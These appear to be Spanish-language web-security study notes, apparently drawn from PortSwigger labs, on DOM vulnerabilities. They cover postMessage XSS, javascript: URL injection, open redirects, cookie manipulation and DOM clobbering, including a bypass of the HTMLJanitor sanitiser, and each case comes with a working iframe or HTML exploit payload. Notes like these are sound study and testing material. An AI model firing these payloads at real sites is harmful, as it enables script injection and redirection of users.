Tags: #pentesting #web-security #DOM #XSS #clobbering #postMessage #javascript #redirection #cookies #portswigger-notes #bug-bounty

---
# Índice

- **[[#1. Web Messages (postMessage)|1. Web Messages (postMessage)]]**
    
    - [[#A. XSS DOM Simple vía postMessage|A. XSS DOM Simple]]
        
    - [[#B. postMessage y URL JavaScript|B. postMessage y URL JavaScript]]
        
    - [[#C. postMessage y JSON.parse|C. postMessage y JSON.parse]]
        
- **[[#2. Redirección Abierta (Open Redirect) DOM|2. Redirección Abierta (Open Redirect) DOM]]**
    
- **[[#3. Manipulación de Cookies vía DOM|3. Manipulación de Cookies vía DOM]]**
    
- **[[#4. DOM Clobbering (Avanzado)|4. DOM Clobbering (Avanzado)]]**
    
    - [[#A. XSS mediante Clobbering de Objetos|A. Clobbering de Objetos]]
        
    - [[#B. Bypass de Filtros (HTMLJanitor)|B. Bypass de Filtros (HTMLJanitor)]]
        
- **[[#📝 Resumen|📝 Resumen Final]]**

---

Las vulnerabilidades de DOM ocurren cuando una aplicación contiene JavaScript que toma datos de una **fuente controlable** (Source) y los pasa a un **sumidero peligroso** (Sink) sin la validación adecuada.

---

## 1. Web Messages (postMessage)

### ¿Qué es postMessage()?

Es un método que permite la comunicación segura entre ventanas de diferentes orígenes (ej. una web y un iframe). Las webs lo usan para enviar datos de configuración, anuncios o altura de reproductores.

- Ventana → iframe
    
- Iframe → ventana padre
    
- Páginas con distinto origen (cross-origin)
    

Se usa habitualmente para:

- Widgets embebidos
    
- Publicidad
    
- Players de vídeo
    
- Integraciones de terceros

### Concepto Clave: El uso del comodín `*`

El segundo parámetro de `postMessage(data, targetOrigin)` indica qué origen puede recibir el mensaje. El uso de `*` (comodín) significa que **cualquier sitio** puede recibirlo o enviarlo, eliminando la seguridad de origen.

---

### A. XSS DOM Simple vía postMessage

**Escenario:** La web escucha mensajes y mete el contenido directamente en el HTML.

- **Código Vulnerable:**
    

```JavaScript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data; // SINK: innerHTML
})
```

- **Por qué es vulnerable:** No verifica quién envía el mensaje (`e.origin`) y usa `innerHTML`, que ejecuta etiquetas `<script>` o eventos `onerror`.
    
- **Explotación:**
    

```HTML
<iframe src="https://victima.com/" onload='this.contentWindow.postMessage("<img src=0 onerror=print()>","*")'></iframe>
```

---

### B. postMessage y URL JavaScript

**Escenario:** El mensaje se usa para redirigir al usuario, pero el filtro es ineficiente.

- **Código Vulnerable:**
    

```JavaScript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url; // SINK: Redirección
    }
});
```

- **Por qué es vulnerable:** El filtro solo comprueba si la cadena _contiene_ `http:`. No obliga a que _empiece_ por ahí.
    
- **Explotación:** Usamos el protocolo `javascript:` y añadimos el protocolo esperado como comentario.
    

```HTML
<iframe src="https://victima.com/" onload='this.contentWindow.postMessage("javascript:print();//https://","*")'></iframe>
```

---

### C. postMessage y JSON.parse

**Escenario:** La web espera un objeto JSON para configurar un reproductor o página.

- **Código Vulnerable:**
    

```JavaScript
d = JSON.parse(e.data);
switch(d.type) {
    case "load-channel":
        ACMEplayer.element.src = d.url; // SINK: Atributo src
        break;
}
```

- **Por qué es vulnerable:** Al confiar en el campo `url` del JSON, podemos inyectar `javascript:`.
    
- **Explotación:**
    

```HTML
<iframe src="https://victima.com/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}","*")'></iframe>
```

---

## 2. Redirección Abierta (Open Redirect) DOM

**Escenario:** El botón "Volver" lee la URL de la barra de direcciones para saber a dónde ir.

- **Código Vulnerable:**
    

```HTML
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : '/'">Back</a>
```

- **Por qué es vulnerable:** La expresión regular `.+` captura cualquier cosa después de `https://`. Un atacante puede poner su propia URL.
    
- **Explotación:** `https://victima.com/post?url=https://malvado.com/`
    

---

## 3. Manipulación de Cookies vía DOM
### Uso real

- Tracking
    
- UX
    
- Última página vista
	

**Escenario:** La web guarda el último producto visitado en una cookie leyendo la URL actual.

- **Código Vulnerable:**
	

```JavaScript
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
```

- **Por qué es vulnerable:** `window.location` contiene toda la URL, incluido el payload malicioso. Si esta cookie se refleja luego en la página sin filtrar, hay XSS.
    
- **Explotación:** Inyectamos un script en la URL. Al cargar el iframe, la cookie se escribe con el script. Luego redirigimos a la víctima a la home donde esa cookie se lee y ejecuta.
	
```HTML
<iframe src="https://victima.com/product?id=1&'><script>print()</script>" onload='this.src="https://victima.com/"'></iframe>
```

---
## 4. DOM Clobbering (Avanzado)

El Clobbering consiste en inyectar HTML para **sobreescribir** variables globales de JavaScript.

### A. XSS mediante Clobbering de Objetos

**Escenario:** El script usa una variable global de configuración que no ha sido declarada.

- **Código Vulnerable:**
    

```JavaScript
let defaultAvatar = window.defaultAvatar || {avatar: '/default.svg'}
let avatarImgHTML = '<img src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

- **Por qué es vulnerable:** Si inyectamos un elemento con `id="defaultAvatar"`, `window.defaultAvatar` dejará de ser `undefined` y pasará a ser nuestro elemento HTML.
    
- **Explotación:** Usamos dos enlaces con el mismo ID para crear una colección, y el atributo `name` para crear la propiedad `.avatar`.
    

```HTML
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

_Resultado:_ `defaultAvatar.avatar` devuelve el `href` del enlace, que inyecta el `onerror` en el `src` de la imagen.

---

### B. Bypass de Filtros (HTMLJanitor)

**Escenario:** Se usa una librería para limpiar el HTML, pero la configuración de la librería es vulnerable a clobbering.

- **Lógica Vulnerable:** La librería recorre atributos: `for (var a = 0; a < node.attributes.length; a++)`. Si el nodo es un `<form>`, podemos sobreescribir la propiedad `.attributes`.
    
- **Explotación:**
    
    1. **Envenenar el DOM:** Inyectamos un formulario que colisione con la variable `attributes`.
        
        
        
        ```HTML
        <form id=x tabindex=0 onfocus=print()><input id=attributes>
        ```
        
    2. **Disparar el Sink:** Usamos un iframe que cargue la página y luego use el fragmento `#x` para hacer scroll automático hacia el elemento con `id=x`, disparando el `onfocus`.
        

```HTML
<iframe src="https://victima.com/post?id=2" onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

---

### 📝 Resumen:

1. **Web Messages:** Busca `addEventListener('message'...)` sin validación de `origin`.
    
2. **Clobbering:** Busca variables que usen `window.variable || ...` o librerías que iteren sobre `.attributes`.
    
3. **Cookies:** Mira si `window.location` se asigna a `document.cookie`.